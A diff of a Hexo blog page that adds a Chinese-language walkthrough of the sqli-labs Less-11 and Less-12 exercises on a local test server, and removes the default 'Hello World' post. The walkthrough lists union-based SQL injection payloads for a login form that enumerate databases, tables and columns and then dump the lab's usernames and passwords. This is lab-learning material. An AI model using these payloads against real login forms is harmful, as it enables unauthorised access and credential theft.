@@ -133,6 +133,75 @@ password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,a
 
 
   
+    <article id="post-sql-labs-Less-11~12" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/06/sql-labs-Less-11~12/" class="article-date">
+  <time datetime="2021-02-06T09:18:42.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-11</h1>
+进入 http://127.0.0.1/sql/Less-11 ，显示如下：
+![1](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/1.png)
+都输入admin进行登入：
+![2](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/2.png)
+然后进行sql注入判断，在username输入admin'，在password输入admin，显示如下：
+![3](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/3.png)
+说明有sql注入漏洞，再在username输入admin'#,password不变，正常登入，说明可以用`‘`注入。
+也可以在username输入admin\，password不输，显示如下：
+![4](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/4.png)
+看到\后面是`'`，说明可以用`'`注入。
+在username输入admin' order by 2#，正常输出，说明数据有两列。
+再在username输入1admin' union select 1,2#(前面的1和less-1的id=-1是一样的道理)：
+![5](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/5.png)
+可以看到1在username输出，2在password输出。
+在username输入1admin' union select 1,database()#：(也可以用1admin' union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin' union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))
+![6](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/6.png)
+可以看到在password输出了库名：security
+再在username输入1admin' union select 1,table_name from information_schema.tables where table_schema='security' limit 0,1#(也可以用1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#)(以下都是用group_concat函数的)
+![7](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/7.png)
+得到表名：emails,referers,uagents,users
+再在username输入1admin' union select 1,column_name from information_schema.columns where table_name='users' limit 0,1#(也可以用1admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#)
+![8](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/8.png)
+得到列名：id,username,password
+再在username输入1admin' union select username,password from users limit 0,1#(也可以用1admin' union select group_concat(username),group_concat(password) from users#)
+![9](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11/9.png)
+得到用户名和密码：
+username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
+
+<h1>Less-12</h1>
+和Less-11一样，只是把'换成了")。
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/06/sql-labs-Less-11~12/" data-id="ckktlz2iv0000l8ux9b376ms4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-9-10" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/03/sql-labs-Less-9-10/" class="article-date">
@@ -569,56 +638,12 @@ password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,a
 
 
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/03/hello-world/" class="article-date">
-  <time datetime="2020-10-03T13:15:06.711Z" itemprop="datePublished">2020-10-03</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/03/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/03/hello-world/" data-id="ckftpds0g0000s4uxd05p2361" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -653,6 +678,10 @@ password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,a
           </li>
         
           <li>
+            <a href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/03/sql-labs-Less-9-10/">sql-labs Less-9~10</a>
           </li>
         
@@ -662,10 +691,6 @@ password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,a
         
           <li>
             <a href="/2021/02/02/sql-labs-Less-7/">sql-labs-Less-7</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/27/sql-labs-Less-5~6/">sql-labs-5~6</a>
           </li>
         
       </ul>
